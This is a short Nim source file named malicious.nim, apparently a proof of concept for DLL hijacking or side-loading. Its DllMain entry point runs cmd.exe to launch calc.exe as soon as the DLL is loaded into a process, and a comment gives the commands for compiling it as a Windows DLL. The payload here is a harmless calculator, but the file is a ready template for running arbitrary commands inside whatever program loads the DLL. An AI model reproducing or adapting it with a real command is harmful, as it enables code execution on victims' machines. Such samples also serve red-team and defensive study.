import winim/lean
import osproc

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()

  if fdwReason == DLL_PROCESS_ATTACH:
    let command = "/r" & " C:/windows/system32/calc.exe"
    discard execProcess("cmd", args=[command], options={poUsePath})
  return true

# nim c -d=mingw --app=lib --nomain --cpu=amd64 malicious.nim 或者 nim c --app=lib --nomain malicious.nim